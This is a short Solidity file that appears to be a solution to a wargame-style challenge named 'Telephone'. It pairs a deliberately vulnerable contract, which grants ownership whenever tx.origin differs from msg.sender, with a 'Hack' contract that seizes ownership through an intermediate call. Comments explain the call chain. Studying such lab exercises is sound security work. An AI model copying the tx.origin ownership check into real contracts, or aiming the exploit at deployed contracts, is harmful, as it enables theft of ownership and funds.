// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// goal to claim ownership
contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


// alice        -> A (hack)        ->B (telephone)
// tx.origin    -> alice           -> alice
// sender       -> alice           -> A


contract Hack{

    constructor(Telephone _target){
        _target.changeOwner(msg.sender);
    }
}
